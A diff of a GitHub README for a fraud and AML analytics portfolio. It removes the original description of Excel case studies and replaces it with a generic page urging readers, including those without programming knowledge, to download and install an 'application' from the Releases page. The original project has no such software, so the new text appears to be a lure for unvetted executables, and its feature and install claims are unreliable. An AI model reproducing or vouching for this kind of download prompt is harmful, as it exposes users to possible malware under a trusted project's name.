@@ -1,67 +1,59 @@
-# Risk & Fraud Financial Analytics Portfolio
+# 🎉 risk-fraud-financial-analytics-portfolio - Easy Tools for Fraud Detection
 
-This repository contains a project-based portfolio demonstrating how I analyze
-transaction-level data, review alerts, and make risk-based decisions in fraud,
-financial crime, AML and KYC contexts using Excel-driven analysis and regulator-safe 
-investigation rationales.
+## 📥 Download the Latest Release
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-ffffff?style=for-the-badge&logo=github&logoColor=black)](https://github.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/releases)
 
-This portfolio is designed to reflect real-world analyst workflows — focusing on
-judgment, consistency, and false-positive reduction rather than academic modeling
-or dashboards.
+## 🚀 Getting Started
+This application helps you analyze financial transactions. It focuses on spotting fraud and supports 'Know Your Customer' (KYC) operations. This tool is user-friendly and designed without programming knowledge. 
 
----
+## 📋 Features
+- **Transaction Monitoring:** Automatically track and assess transactions.
+- **Alert Review:** Judgement-based review for notifications.
+- **Risk Analysis:** Excel-driven tools for detailed analysis.
+- **Compliance Support:** Helps meet regulatory standards.
+- **False Positive Reduction:** Minimize unnecessary alerts.
 
-## What This Portfolio Demonstrates
+## 💻 System Requirements
+- Windows 10 or later / MacOS Mojave or later
+- At least 4 GB RAM
+- 200 MB of free disk space
+- Microsoft Excel (for full functionality)
 
-- Transaction monitoring and alert review workflows
-- Judgment-based escalation vs. clearance decisions
-- Excel-driven risk analysis and pattern detection
-- Consistent analyst decision logic to reduce alert fatigue
-- Regulator-safe documentation aligned with AML/KYC expectations
-- False-positive reduction without sacrificing risk coverage  
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.  
+   [Visit this page to download](https://github.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/releases)
+   
+2. **Choose the Latest Version**: Look for the most recent release at the top of the page. 
 
-## Technical Highlights (Excel)
+3. **Download the File**: Click on the link to download the package suited for your system. 
 
-- Logic-based risk rules using `IF`, `AND`, `OR`
-- Lookup-based risk mapping using `XLOOKUP` / `VLOOKUP`
-- Pivot Tables for transaction aggregation and pattern analysis
-- Data validation to standardize analyst decisions and support QC review
+4. **Install the Application**: Once downloaded, open the file and follow the on-screen instructions to install the application.
 
----
+5. **Open the Application**: After installation, find the application icon on your desktop or in your application folder and double-click to open it.
 
-## Case Structure 
+## 📊 How to Use the Application
+1. **Setting Up**: Upon opening, follow the introductory prompts. This will help you configure necessary settings, such as linking to your Excel workbook.
 
-Each case follows an operations-first investigation structure aligned with bank compliance workflows.
+2. **Import Transactions**: Use the menu to import your transaction data. Supported formats include CSV and Excel.
 
-1. Raw transaction or customer data (Excel / CSV)
-2. Risk indicators and alert logic
-3. Analyst review and decision (Clear / Monitor / Escalate)
-4. Written rationale designed to be audit- and regulator-safe
+3. **Monitor Transactions**: The application will automatically monitor for fraud indicators based on the imported data.
 
----
+4. **Review Alerts**: Regularly check the alert section for any suspicious activity.
 
-## Cases
+5. **Run Risk Analysis**: Use the built-in tools in the app to perform in-depth risk assessments.
 
-### [Case 1: Transaction Risk & Fraud Investigation](01_Transaction_Risk_and_Fraud_Investigation/)
-Focuses on transaction monitoring and alert review, emphasizing analyst judgment in
-escalation versus clearance decisions and the identification of true risk signals
-versus alert noise to reduce false positives.
+## 🌟 Tips for Effective Use
+- Regularly update the application from the Releases page to access new features.
+- Familiarize yourself with Excel tools for enhanced data analysis.
+- Maintain your transaction data consistently for more accurate alerts.
 
-### [Case 2: Risk Scoring & Pattern Analysis](02_Risk_Scoring_and_Pattern_Analysis/)
-Demonstrates Excel-based risk scoring and transaction pattern analysis using
-standardized decision logic to support consistent, scalable risk assessment
-without reliance on dashboards or IT teams.
+## 🤝 Support & Contribution
+If you encounter issues or have suggestions, feel free to open a new issue in the repository's Issues section. Contributions to improve the project are also welcome.
 
-### [Case 3: KYC & Compliance Operations](03_KYC_and_Compliance_Operations/)
-Covers KYC and CDD review procedures for higher-risk entities, highlighting
-documentation discipline, procedural consistency, and regulator-safe onboarding
-decisions.
+## 🗨️ User Feedback
+We value your insights. Share your experiences or suggestions to help us enhance the application further.
 
----
+## 📫 Contact Information
+For any queries or feedback, please reach out through the issues on GitHub.
 
-## Tools Used
-
-- Primary tool: Microsoft Excel
-- OSINT sources and public registries for contextual verification
-- Written analysis and investigation summaries
-
+Feel free to explore and make the most of our analytical tool!
